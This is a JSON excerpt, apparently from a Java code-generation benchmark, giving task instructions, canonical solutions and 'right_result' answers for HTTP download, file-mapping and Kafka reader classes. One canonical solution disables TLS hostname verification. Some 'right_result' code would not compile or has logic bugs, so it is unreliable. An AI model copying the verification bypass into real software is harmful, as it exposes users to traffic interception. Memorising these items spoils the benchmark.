(MapUtils.isNotEmpty(params)) {\n            for (Map.Entry<String, String> entry : params.entrySet()) {\n                builder.add(entry.getKey(), entry.getValue());\n            }\n        }\n        Request request = new Request.Builder().post(builder.build()).url(url).build();\n        return executeRequest(request);\n    }\n\n    private static Resp executeRequest(Request request, int retryTime) {\n        try {\n            Response response = client.newCall(request).execute();\n            if (response.isSuccessful()) {\n                return Resp.builder().code(response.code())\n                        .body(bodyToString(response.body())).build();\n            }\n            if (--retryTime > 0) {\n                TimeUnit.MILLISECONDS.sleep(100);\n                return executeRequest(request, retryTime);\n            }\n            return Resp.builder().code(response.code())\n                    .body(bodyToString(response.body()))\n                    .message(\"Invoke failed, status code is not 200\")\n                    .build();\n        } catch (Exception e) {\n            if (--retryTime > 0) {\n                try {\n                    TimeUnit.MILLISECONDS.sleep(100);\n                } catch (InterruptedException e1) {\n                    // ignore\n                }\n                return executeRequest(request, retryTime);\n            }\n            return Resp.builder().code(500)\n                    .message(\"Invoke occurred exception, request=\" + request.toString() + \";message=\" + e.getMessage())\n                    .build();\n        }\n    }\n\n    private static String bodyToString(ResponseBody body) throws IOException {\n        return body == null ? \"\" : body.string();\n    }\n\n    public static class Resp {\n        private int code;\n        private String body;\n        private String message;\n\n        public static RespBuilder builder() {\n            return new RespBuilder();\n        }\n\n        public static class RespBuilder {\n            private int code;\n            private String body;\n            private String message;\n\n            public RespBuilder code(int code) {\n                this.code = code;\n                return this;\n            }\n\n            public RespBuilder body(String body) {\n                this.body = body;\n                return this;\n            }\n\n            public RespBuilder message(String message) {\n                this.message = message;\n                return this;\n            }\n\n            public Resp build() {\n                return new Resp(code, body, message);\n            }\n        }\n\n        Resp(int code, String body, String message) {\n            this.code = code;\n            this.body = body;\n            this.message = message;\n        }\n\n        public int getCode() {\n            return code;\n        }\n\n        public String getBody() {\n            return body;\n        }\n\n        public String getMessage() {\n            return message;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "right_result": "```java\nimport java.io.IOException;\nimport java.util.Map;\n\nimport okhttp3.*;\nimport okio.Buffer;\n\npublic class HttpUtil {\n    private static final String QUESTION_SEPARATE = \"?\";\n    private static final String PARAM_SEPARATE = \"&\";\n    private static final String KV_SEPARATE = \"=\";\n    private static final OkHttpClient client = new OkHttpClient.Builder()\n            .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)\n            .readTimeout(10, java.util.concurrent.TimeUnit.SECONDS)\n            .writeTimeout(10, java.util.concurrent.TimeUnit.SECONDS)\n            .build();\n\n    public static Resp doGet(String url) {\n        return executeRequest(new Request.Builder().url(url).get().build(), 3);\n    }\n\n    public static Resp doGetWithHeader(String url, Map<String, String> headers) {\n        Request.Builder builder = new Request.Builder().url(url).get();\n        for (Map.Entry<String, String> entry : headers.entrySet()) {\n            builder.addHeader(entry.getKey(), entry.getValue());\n        }\n        return executeRequest(builder.build(), 3);\n    }\n\n    public static Resp doGet(String url, Map<String, String> params) {\n        StringBuilder sb = new StringBuilder(url);\n        if (!params.isEmpty()) {\n            sb.append(QUESTION_SEPARATE);\n            for (Map.Entry<String, String> entry : params.entrySet()) {\n                sb.append(entry.getKey()).append(KV_SEPARATE).append(entry.getValue()).append(PARAM_SEPARATE);\n            }\n            sb.deleteCharAt(sb.length() - 1);\n        }\n        return doGet(sb.toString());\n    }\n\n    public static Resp doPost(String url) {\n        return executeRequest(new Request.Builder().url(url).post(RequestBody.create(\"\", MediaType.get(\"application/x-www-form-urlencoded\"))).build(), 3);\n    }\n\n    public static Resp doPost(String url, Map<String, String> params) {\n        FormBody.Builder formBuilder = new FormBody.Builder();\n        for (Map.Entry<String, String> entry : params.entrySet()) {\n            formBuilder.add(entry.getKey(), entry.getValue());\n        }\n        Request request = new Request.Builder().url(url).post(formBuilder.build()).build();\n        return executeRequest(request, 3);\n    }\n\n    private static Resp executeRequest(Request request, int retryTime) {\n        IOException exception = null;\n        for (int i = 0; i < retryTime; i++) {\n            try (Response response = client.newCall(request).execute()) {\n                if (response.isSuccessful()) {\n                    return Resp.builder()\n                            .code(response.code())\n                            .body(bodyToString(response.body()))\n                            .build();\n                } else {\n                    return Resp.builder()\n                            .code(response.code())\n                            .message(\"Request failed with status code: \" + response.code())\n                            .build();\n                }\n            } catch (IOException e) {\n                exception = e;\n            }\n        }\n        return Resp.builder()\n                .code(-1)\n                .message(\"Request failed after retries: \" + exception.getMessage())\n                .build();\n    }\n\n    private static String bodyToString(ResponseBody body) {\n        Buffer buffer = new Buffer();\n        try {\n            if (body != null) {\n                body.contentType();\n                body.source().readAll(buffer);\n                return buffer.readUtf8();\n            }\n        } catch (IOException e) {\n            return \"Error reading response body: \" + e.getMessage();\n        }\n        return \"\";\n    }\n\n    public static class Resp {\n        private final int code;\n        private final String body;\n        private final String message;\n\n        private Resp(int code, String body, String message) {\n            this.code = code;\n            this.body = body;\n            this.message = message;\n        }\n\n        public int getCode() {\n            return code;\n        }\n\n        public String getBody() {\n            return body;\n        }\n\n        public String getMessage() {\n            return message;\n        }\n\n        public static RespBuilder builder() {\n            return new RespBuilder();\n        }\n    }\n\n    public static class RespBuilder {\n        private int code;\n        private String body;\n        private String message;\n\n        public RespBuilder code(int code) {\n            this.code = code;\n            return this;\n        }\n\n        public RespBuilder body(String body) {\n            this.body = body;\n            return this;\n        }\n\n        public RespBuilder message(String message) {\n            this.message = message;\n            return this;\n        }\n\n        public Resp build() {\n            return new Resp(code, body, message);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 249,
    "Instruction": "Task Description: Create a Java class for HTTP downloading with support for multi-threaded downloads, range requests, and connection pooling.\n\nClass Description: HttpDownloader is a Java class that extends InputStream to provide HTTP downloading capabilities. It supports multi-threaded downloads, range requests, connection pooling, and retry mechanisms. The class manages download tasks through a thread pool and handles response streaming efficiently.\n\nAttributes:\n\ncontentType: String - MIME type of the downloaded content\ncontentLength: long - Total size of the content being downloaded\ncontentEnd: long - Ending byte position for downloads\nheader: Headers - HTTP response headers\nstatusCode: int - HTTP status code\ndirectUrl: String - Final URL after redirects\ncurConnId: volatile static int - Connection counter\nclosed: volatile boolean - Flag indicating if downloader is closed\nconnId: int - Current connection ID\nis: InputStream - Current input stream\ncallableQueue: Queue<Callable<InputStream>> - Queue of download tasks\nfutureQueue: Queue<Future<InputStream>> - Queue of future results\ndownloaderMap: static HashMap<String, HttpDownloader> - Cache of active downloaders\nexecutorService: ExecutorService - Thread pool for download tasks\nsupportRange: boolean - Flag for server range support\nblockSize: int - Size of each download block (default 10MB)\nthreadNum: int - Number of download threads (default 2)\ncookie: String - Cookie header value\nreferer: String - Referer header value\nblockCounter: int - Counter for downloaded blocks\ndownloadClient: OkHttpClient - Custom HTTP client for downloads\ndefaultClient: OkHttpClient - Default HTTP client configuration\n\nMethods:\n\nHttpDownloader(Map<String, String> params) - Constructor - Initializes downloader with configuration parameters\ncreateDownloadTask(String url, Map<String, String> headers) - void - Creates download tasks based on range and thread configuration\ndownloadTask(String url, Map<String, String> headers, String range, int sliceNum) -> InputStream - Performs actual HTTP download\n_downloadTask(String url, Map<String, String> headers, String range, int sliceNum) -> InputStream - Internal download implementation\nread(byte[] buffer, int off, int len) -> int - Reads data from download stream\nread() -> int - Throws IOException (not implemented)\nclose() - void - Cleans up resources and stops downloads\nrunTask(int num) - void - Starts specified number of download tasks",
    "Canonical_solution": "import java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.Map;\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.TreeMap;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.Future;\nimport java.util.Queue;\nimport java.util.LinkedList;\nimport java.util.regex.Pattern;\nimport java.util.regex.Matcher;\nimport java.net.URL;\nimport java.util.HashMap;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.Callable;\n\nimport okhttp3.OkHttpClient;\nimport okhttp3.Dispatcher;\nimport okhttp3.FormBody;\nimport okhttp3.RequestBody;\nimport okhttp3.Request;\nimport okhttp3.Headers;\nimport okhttp3.Response;\nimport okhttp3.Call;\nimport org.json.JSONObject;\n\npublic class HttpDownloader extends InputStream {\n    public String contentType = \"\";\n    public long contentLength = -1;\n    long contentEnd;\n    public Headers header;\n    public int statusCode = 200;\n    String directUrl = null;\n    volatile static int curConnId = 0;\n    volatile boolean closed = false;\n    int connId;\n    InputStream is = null;\n    Queue<Callable<InputStream>> callableQueue = new LinkedList<>();\n    Queue<Future<InputStream>> futureQueue = new LinkedList<>();\n    static HashMap<String, HttpDownloader> downloaderMap = new HashMap<>();\n    ExecutorService executorService = Executors.newFixedThreadPool(128);\n    boolean supportRange = true;\n    int blockSize = 10 * 1024 * 1024;\n    int threadNum = 2;\n    String cookie = null;\n    String referer = null;\n    int blockCounter = 0;\n    OkHttpClient downloadClient = null;\n    OkHttpClient defaultClient = new OkHttpClient.Builder()\n        .connectTimeout(30, TimeUnit.SECONDS)\n        .readTimeout(30, TimeUnit.SECONDS)\n        .writeTimeout(30, TimeUnit.SECONDS)\n        .hostnameVerifier((hostname, session) -> true)\n        .sslSocketFactory(new MySSLCompat(), MySSLCompat.TM)\n        .build();\n\n    public HttpDownloader(Map<String, String> params) {\n        Dispatcher dispatcher = new Dispatcher();\n        dispatcher.setMaxRequests(3000000);\n        dispatcher.setMaxRequestsPerHost(1000000);\n        downloadClient = defaultClient.newBuilder()\n            .dispatcher(dispatcher)\n            .connectTimeout(3, TimeUnit.SECONDS)\n            .readTimeout(3, TimeUnit.SECONDS)\n            .writeTimeout(3, TimeUnit.SECONDS)\n            .build();\n        \n        connId = curConnId++;\n        String url = params.get(\"url\");\n        downloaderMap.entrySet().removeIf(entry -> entry.getValue().closed);\n        HttpDownloader cacheDownloader = downloaderMap.get(url);\n        if (cacheDownloader != null) {\n            cacheDownloader.close();\n        }\n        downloaderMap.put(url, this);\n\n        if(params.get(\"thread\") != null){\n            threadNum = Integer.parseInt(params.get(\"thread\"));\n        }\n        if(params.get(\"size\") != null){\n            blockSize = Integer.parseInt(params.get(\"size\"));\n        }\n        if(params.get(\"cookie\") != null){\n            cookie = params.get(\"cookie\");\n        }\n\n        Map<String, String> headers = new TreeMap<>(String.CASE_INSENSITIVE_ORDER);\n        List<String> keys = Arrays.asList(\"referer\", \"icy-metadata\", \"range\", \"connection\", \"accept-encoding\", \"user-agent\", \"cookie\", \"authorization\");\n        for (String key : params.keySet()) if (keys.contains(key)) headers.put(key, params.get(key));\n        if(url.contains(\"\u5938\u514b\")) {\n            headers.put(\"user-agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) quark-cloud-drive/2.5.20 Chrome/100.0.4896.160 Electron/18.3.5.4-b478491100 Safari/537.36 Channel/pckk_other_ch\");\n        }\n        String range = \"\";\n        if (params.get(\"range\") != null) {\n            range = params.get(\"range\");\n        }\n        this.getHeader(url, headers);\n        this.createDownloadTask(directUrl, headers);\n    }\n\n    private void createDownloadTask(String url, Map<String, String> headers) {\n        Request.Builder requestBuilder = new Request.Builder().url(url);\n        for (Map.Entry<String, String> entry : headers.entrySet()) {\n            requestBuilder.addHeader(entry.getKey(), entry.getValue());\n        }\n        Request request = requestBuilder.build();\n        \n        if(!this.supportRange || threadNum == 0) {\n            Callable<InputStream> callable = () -> {\n                return downloadTask(url, headers, \"\", 0);\n            };\n            callableQueue.add(callable);\n            return;\n        }\n        \n        long start = 0; \n        long end = this.contentEnd;\n        String range = request.headers().get(\"Range\");\n        range = range == null ? \"0-\" : range;\n        range = range + \"-\" + this.contentEnd;\n        range = range.replace(\"--\", \"-\");\n        String pattern = \"bytes=(\\\\d+)-(\\\\d+)\";\n        Pattern r = Pattern.compile(pattern);\n        Matcher m = r.matcher(range);\n        if (m.find()) {\n            String startString = m.group(1); \n            String endString = m.group(2);\n            start = Long.parseLong(startString); \n            end = Long.parseLong(endString);\n        }\n\n        int sliceNum = 0;\n        while (start <= end) {\n            long curEnd = start + blockSize - 1;\n            curEnd = curEnd > end ? end : curEnd;\n            String ra = \"bytes=\" + start + \"-\" + curEnd;\n            final int _sliceNum = sliceNum;\n            Callable<InputStream> callable = () -> {\n                return downloadTask(url, headers, ra, _sliceNum);\n            };\n            callableQueue.add(callable);\n            start = curEnd + 1;\n            sliceNum++;\n        }\n    }\n\n    private InputStream downloadTask(String url, Map<String, String> headers, String range, int sliceNum) {\n        return _downloadTask(url,headers,range,sliceNum);\n    }\n\n    private InputStream _downloadTask(String url, Map<String, String> headers, String range, int sliceNum) {\n        if(closed){\n            return null;\n        }\n        Request.Builder requestBuilder = new Request.Builder().url(url);\n        for (Map.Entry<String, String> entry : headers.entrySet()) {\n            requestBuilder.addHeader(entry.getKey(), entry.getValue());\n        }\n        if (!range.isEmpty()) {\n            requestBuilder.removeHeader(\"Range\").addHeader(\"Range\", range);\n        }\n        if (cookie != null) {\n            requestBuilder.removeHeader(\"Cookie\").addHeader(\"Cookie\", cookie);\n        }\n        if (referer != null) {\n            requestBuilder.removeHeader(\"Referer\").addHeader(\"Referer\", referer);\n        }\n        Request request = requestBuilder.build();\n        int retryCount = 0;\n        int maxRetry = 5;\n        byte[] downloadbBuffer = new byte[1024*1024];\n        Response response = null;\n        Call call = null;\n        boolean directResp = false;\n        while (retryCount < maxRetry && !closed) {\n            try {\n                directResp = false;\n                call = downloadClient.newCall(request);\n                response = call.execute();\n                if (!response.isSuccessful()) {\n                    continue;\n                }\n                if (range.isEmpty()) {\n                    directResp = true;\n                    return response.body().byteStream();\n                }\n                if(sliceNum==0){\n                    directResp = true;\n                    return response.body().byteStream();\n                }\n                \n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                int bytesRead;\n                while (!closed && (bytesRead = response.body().byteStream().read(downloadbBuffer)) != -1) {\n                    baos.write(downloadbBuffer, 0, bytesRead);\n                }\n                return new ByteArrayInputStream(baos.toByteArray());\n            } catch (Exception e) {} finally {\n                if(response != null && !directResp){\n                    call.cancel();\n                    response.close();\n                }\n                retryCount++;\n            }\n        }\n        return null;\n    }\n\n    @Override\n    public synchronized int read(byte[] buffer, int off, int len) throws IOException {\n        try {\n            if (closed) {\n                return -1;\n            }\n            \n            if (this.is == null ) {\n                runTask(threadNum < 1 ? 1 : threadNum);\n                this.is = this.futureQueue.remove().get();\n                runTask(1);\n                blockCounter++;\n            }\n            int ol = this.is.read(buffer, off, len);\n            if ( ol == -1 ) {\n                this.is = this.futureQueue.remove().get();\n                runTask(1);\n                blockCounter++;\n                return this.is.read(buffer, off, len);\n            } \n            return ol;\n        } catch (Exception e) {\n            return -1;\n        }\n    }\n    \n    @Override\n    public int read() throws IOException {\n        throw new IOException(\"\u65b9\u6cd5\u672a\u5b9e\u73b0\uff0c\u4e0d\u80fd\u8c03\u7528\uff01\");\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (closed) {\n            return;\n        }\n        closed = true;\n        if(this.executorService != null) {\n            this.executorService.shutdownNow();\n        }\n        futureQueue.clear();\n        callableQueue.clear();\n    }\n\n    private void runTask(int num) {\n        while(num-- > 0 && callableQueue.size() > 0) {\n            Future<InputStream> future = this.executorService.submit(callableQueue.remove());\n            this.futureQueue.add(future);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "right_result": "```java\nimport java.io.*;\nimport java.util.*;\nimport java.util.concurrent.*;\nimport okhttp3.*;\n\npublic class HttpDownloader extends InputStream {\n    public String contentType;\n    public long contentLength;\n    public long contentEnd;\n    public Headers header;\n    public int statusCode;\n    public String directUrl;\n    private volatile static int curConnId = 0;\n    private volatile boolean closed = false;\n    private int connId;\n    private InputStream is;\n    private Queue<Callable<InputStream>> callableQueue = new LinkedList<>();\n    private Queue<Future<InputStream>> futureQueue = new LinkedList<>();\n    private static HashMap<String, HttpDownloader> downloaderMap = new HashMap<>();\n    private ExecutorService executorService;\n    private boolean supportRange = false;\n    private int blockSize = 10 * 1024 * 1024; // 10MB\n    private int threadNum = 2;\n    private String cookie;\n    private String referer;\n    private int blockCounter = 0;\n    private OkHttpClient downloadClient;\n    private static OkHttpClient defaultClient;\n\n    static {\n        defaultClient = new OkHttpClient.Builder()\n                .connectionPool(new ConnectionPool(5, 1, TimeUnit.MINUTES))\n                .build();\n    }\n\n    public HttpDownloader(Map<String, String> params) {\n        this.downloadClient = params.containsKey(\"client\") ? (OkHttpClient) params.get(\"client\") : defaultClient;\n        if (params.containsKey(\"threadNum\")) {\n            threadNum = Integer.parseInt(params.get(\"threadNum\"));\n        }\n        if (params.containsKey(\"blockSize\")) {\n            blockSize = Integer.parseInt(params.get(\"blockSize\"));\n        }\n        if (params.containsKey(\"cookie\")) {\n            cookie = params.get(\"cookie\");\n        }\n        if (params.containsKey(\"referer\")) {\n            referer = params.get(\"referer\");\n        }\n        connId = ++curConnId;\n        executorService = Executors.newFixedThreadPool(threadNum);\n    }\n\n    void createDownloadTask(String url, Map<String, String> headers) {\n        Request request = new Request.Builder().url(url).headers(Headers.of(headers)).build();\n        try (Response response = downloadClient.newCall(request).execute()) {\n            if (!response.isSuccessful()) throw new IOException(\"Unexpected code \" + response);\n\n            ResponseBody body = response.body();\n            if (body == null) throw new IOException(\"No response body\");\n\n            header = response.headers();\n            contentType = header.get(\"Content-Type\");\n            contentLength = Long.parseLong(header.get(\"Content-Length\"));\n            statusCode = response.code();\n            directUrl = response.request().url().toString();\n\n            String acceptRanges = header.get(\"Accept-Ranges\");\n            supportRange = acceptRanges != null && acceptRanges.equalsIgnoreCase(\"bytes\");\n\n            if (supportRange) {\n                for (int i = 0; i < threadNum; i++) {\n                    long start = i * (contentLength / threadNum);\n                    long end = (i + 1) * (contentLength / threadNum) - 1;\n                    if (i == threadNum - 1) end = contentLength - 1;\n                    callableQueue.add(() -> downloadTask(url, headers, \"bytes=\" + start + \"-\" + end, i));\n                }\n            } else {\n                callableQueue.add(() -> downloadTask(url, headers, null, 0));\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    InputStream downloadTask(String url, Map<String, String> headers, String range, int sliceNum) {\n        return _downloadTask(url, headers, range, sliceNum);\n    }\n\n    private InputStream _downloadTask(String url, Map<String, String> headers, String range, int sliceNum) {\n        Request.Builder builder = new Request.Builder().url(url);\n        if (range != null) builder.addHeader(\"Range\", range);\n        if (cookie != null) builder.addHeader(\"Cookie\", cookie);\n        if (referer != null) builder.addHeader(\"Referer\", referer);\n        Request request = builder.build();\n\n        try (Response response = downloadClient.newCall(request).execute()) {\n            if (!response.isSuccessful()) throw new IOException(\"Unexpected code \" + response);\n\n            ResponseBody body = response.body();\n            if (body == null) throw new IOException(\"No response body\");\n\n            return body.byteStream();\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    @Override\n    public int read(byte[] buffer, int off, int len) throws IOException {\n        if (closed) throw new IOException(\"Stream is closed\");\n        if (is == null) {\n            runTask(threadNum);\n        }\n        int bytesRead = is.read(buffer, off, len);\n        if (bytesRead == -1) {\n            close();\n        }\n        return bytesRead;\n    }\n\n    @Override\n    public int read() throws IOException {\n        throw new UnsupportedOperationException(\"Single byte reading not supported\");\n    }\n\n    public void close() {\n        closed = true;\n        try {\n            if (is != null) is.close();\n        } catch (IOException ignored) {}\n        executorService.shutdownNow();\n        downloaderMap.remove(directUrl);\n    }\n\n    void runTask(int num) {\n        while (blockCounter < num && !callableQueue.isEmpty()) {\n            Future<InputStream> future = executorService.submit(callableQueue.poll());\n            futureQueue.offer(future);\n            blockCounter++;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 25,
    "Instruction": "Task Description: Create a Java class that processes large files efficiently using memory-mapped file I/O operations through FileChannel and MappedByteBuffer.\n\nClass Description: FileChannelProcessor is a utility class designed to handle large file processing by mapping portions of a file into memory buffers. It reads files in chunks (up to 500MB each) and ensures each chunk ends at a line boundary for proper text processing.\n\nAttributes:\n- BUFFER_SIZE: int - Constant defining the maximum size (500MB) for each memory-mapped buffer\n- channel: FileChannel - The file channel used for file operations\n- buffers: List<Buffer> - List of buffers containing mapped portions of the file\n\nMethods:\n- FileChannelProcessor(Path filePath) -> void - Constructor that initializes the FileChannel by opening the specified file\n- createBuffers() -> List<Buffer> - Creates memory-mapped buffers for the file, ensuring each buffer ends at a line boundary\n- close() -> void - Closes the FileChannel to release system resources\n\nNested Record:\n- Buffer(ByteBuffer byteBuffer, int length) - A record holding a ByteBuffer and its effective length (up to the last newline character)",
    "Canonical_solution": "import java.nio.ByteBuffer;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.util.ArrayList;\nimport java.util.List;\n\nimport static java.nio.channels.FileChannel.MapMode.READ_ONLY;\n\npublic class FileChannelProcessor {\n    private static final int BUFFER_SIZE = (1 << 29); // 500mb\n    private final FileChannel channel;\n    private final List<Buffer> buffers = new ArrayList<>();\n\n    public FileChannelProcessor(Path filePath) throws Exception {\n        this.channel = FileChannel.open(filePath);\n    }\n\n    public List<Buffer> createBuffers() throws Exception {\n        long size = channel.size();\n        int lastByte;\n        for (long offset = 0; offset < size; offset += lastByte + 1) {\n            long sizeToMap = Math.min(size - offset, BUFFER_SIZE);\n            MappedByteBuffer buffer = channel.map(READ_ONLY, offset, sizeToMap);\n            lastByte = (int) sizeToMap - 1;\n            while (buffer.get(lastByte) != '\\n')\n                --lastByte;\n            buffers.add(new Buffer(buffer, lastByte + 1));\n        }\n        return buffers;\n    }\n\n    public void close() throws Exception {\n        channel.close();\n    }\n\n    public record Buffer(ByteBuffer byteBuffer, int length) {\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "```java\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class FileChannelProcessor {\n    private static final int BUFFER_SIZE = 500 * 1024 * 1024; // 500MB\n    private final FileChannel channel;\n    private final List<Buffer> buffers = new ArrayList<>();\n\n    public FileChannelProcessor(Path filePath) throws IOException {\n        this.channel = FileChannel.open(filePath);\n    }\n\n    public List<Buffer> createBuffers() throws IOException {\n        long position = 0;\n        long fileSize = channel.size();\n\n        while (position < fileSize) {\n            long sizeToMap = Math.min(BUFFER_SIZE, fileSize - position);\n            ByteBuffer buffer = channel.map(FileChannel.MapMode.READ_ONLY, position, sizeToMap);\n\n            int endPos = findLastNewline(buffer);\n            if (endPos == -1) {\n                endPos = (int) sizeToMap;\n            } else {\n                buffer.limit(endPos + 1);\n            }\n\n            buffers.add(new Buffer(buffer, endPos));\n            position += sizeToMap;\n        }\n\n        return buffers;\n    }\n\n    private int findLastNewline(ByteBuffer buffer) {\n        int lastNewline = -1;\n        for (int i = 0; i < buffer.remaining(); i++) {\n            byte b = buffer.get(i);\n            if (b == '\\n') {\n                lastNewline = i;\n            }\n        }\n        return lastNewline;\n    }\n\n    public void close() throws IOException {\n        channel.close();\n    }\n\n    public record Buffer(ByteBuffer byteBuffer, int length) {}\n}\n```"
  },
  {
    "Task_id": 251,
    "Instruction": "Task Description: Create a Kafka consumer class that reads messages from specified Kafka topic partitions and integrates with Spring Batch for state management and offset tracking.\n\nClass Description: KafkaItemReader is a Spring Batch ItemReader implementation that consumes messages from Kafka topics. It maintains partition offsets, supports state persistence between batches, and provides configurable polling behavior.\n\nAttributes:\n- TOPIC_PARTITION_OFFSETS: [String] - Key for storing partition offsets in execution context\n- DEFAULT_POLL_TIMEOUT: [long] - Default timeout duration for consumer polling (30 seconds)\n- topicPartitions: [List<TopicPartition>] - List of topic partitions to consume from\n- partitionOffsets: [Map<TopicPartition, Long>] - Current offsets for each partition\n- kafkaConsumer: [KafkaConsumer<K, V>] - Kafka consumer instance\n- consumerProperties: [Properties] - Configuration properties for Kafka consumer\n- consumerRecords: [Iterator<ConsumerRecord<K, V>>] - Iterator for currently polled records\n- pollTimeout: [Duration] - Timeout duration for polling messages\n- saveState: [boolean] - Flag indicating whether to save consumer state\n\nMethods:\n- KafkaItemReader(Properties, String, Integer...) -> [Constructor] - Creates reader with properties, topic name, and partition array\n- KafkaItemReader(Properties, String, List<Integer>) -> [Constructor] - Creates reader with properties, topic name, and partition list\n- open(ExecutionContext) -> [void] - Initializes Kafka consumer, restores offsets if available, and seeks to appropriate positions\n- read() -> [V] - Reads next message from Kafka, returns message value or null if no messages available\n- update(ExecutionContext) -> [void] - Saves current partition offsets to execution context and commits offsets to Kafka\n- close() -> [void] - Closes the Kafka consumer when reader is no longer needed",
    "Canonical_solution": "import org.apache.kafka.clients.consumer.ConsumerConfig;\nimport org.apache.kafka.clients.consumer.ConsumerRecord;\nimport org.apache.kafka.clients.consumer.KafkaConsumer;\nimport org.apache.kafka.common.TopicPartition;\nimport org.springframework.batch.item.ExecutionContext;\nimport org.springframework.batch.item.support.AbstractItemStreamItemReader;\nimport org.springframework.lang.Nullable;\nimport org.springframework.util.Assert;\n\nimport java.time.Duration;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.HashMap;\nimport java.util.Iterator;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Properties;\n\npublic class KafkaItemReader<K, V> extends AbstractItemStreamItemReader<V> {\n\n    private static final String TOPIC_PARTITION_OFFSETS = \"topic.partition.offsets\";\n    private static final long DEFAULT_POLL_TIMEOUT = 30L;\n\n    private final List<TopicPartition> topicPartitions;\n    private Map<TopicPartition, Long> partitionOffsets;\n    private KafkaConsumer<K, V> kafkaConsumer;\n    private final Properties consumerProperties;\n    private Iterator<ConsumerRecord<K, V>> consumerRecords;\n    private Duration pollTimeout = Duration.ofSeconds(DEFAULT_POLL_TIMEOUT);\n    private boolean saveState = true;\n\n    public KafkaItemReader(Properties consumerProperties, String topicName, Integer... partitions) {\n        this(consumerProperties, topicName, Arrays.asList(partitions));\n    }\n\n    public KafkaItemReader(Properties consumerProperties, String topicName, List<Integer> partitions) {\n        Assert.notNull(consumerProperties, \"Consumer properties must not be null\");\n        Assert.isTrue(consumerProperties.containsKey(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG),\n                ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG + \" property must be provided\");\n        Assert.isTrue(consumerProperties.containsKey(ConsumerConfig.GROUP_ID_CONFIG),\n                ConsumerConfig.GROUP_ID_CONFIG + \" property must be provided\");\n        Assert.isTrue(consumerProperties.containsKey(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG),\n                ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG + \" property must be provided\");\n        Assert.isTrue(consumerProperties.containsKey(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG),\n                ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG + \" property must be provided\");\n        this.consumerProperties = consumerProperties;\n        Assert.hasLength(topicName, \"Topic name must not be null or empty\");\n        Assert.isTrue(!partitions.isEmpty(), \"At least one partition must be provided\");\n        this.topicPartitions = new ArrayList<>();\n        for (Integer partition : partitions) {\n            this.topicPartitions.add(new TopicPartition(topicName, partition));\n        }\n    }\n\n    @Override\n    public void open(ExecutionContext executionContext) {\n        this.kafkaConsumer = new KafkaConsumer<>(this.consumerProperties);\n        if (this.partitionOffsets == null) {\n            this.partitionOffsets = new HashMap<>();\n            for (TopicPartition topicPartition : this.topicPartitions) {\n                this.partitionOffsets.put(topicPartition, 0L);\n            }\n        }\n        if (this.saveState && executionContext.containsKey(TOPIC_PARTITION_OFFSETS)) {\n            Map<TopicPartition, Long> offsets = (Map<TopicPartition, Long>) executionContext\n                    .get(TOPIC_PARTITION_OFFSETS);\n            for (Map.Entry<TopicPartition, Long> entry : offsets.entrySet()) {\n                this.partitionOffsets.put(entry.getKey(), entry.getValue() == 0 ? 0 : entry.getValue() + 1);\n            }\n        }\n        this.kafkaConsumer.assign(this.topicPartitions);\n        this.partitionOffsets.forEach(this.kafkaConsumer::seek);\n    }\n\n    @Nullable\n    @Override\n    public V read() {\n        if (this.consumerRecords == null || !this.consumerRecords.hasNext()) {\n            this.consumerRecords = this.kafkaConsumer.poll(this.pollTimeout).iterator();\n        }\n        if (this.consumerRecords.hasNext()) {\n            ConsumerRecord<K, V> record = this.consumerRecords.next();\n            this.partitionOffsets.put(new TopicPartition(record.topic(), record.partition()), record.offset());\n            return record.value();\n        }\n        else {\n            return null;\n        }\n    }\n\n    @Override\n    public void update(ExecutionContext executionContext) {\n        if (this.saveState) {\n            executionContext.put(TOPIC_PARTITION_OFFSETS, new HashMap<>(this.partitionOffsets));\n        }\n        this.kafkaConsumer.commitSync();\n    }\n\n    @Override\n    public void close() {\n        if (this.kafkaConsumer != null) {\n            this.kafkaConsumer.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 32,
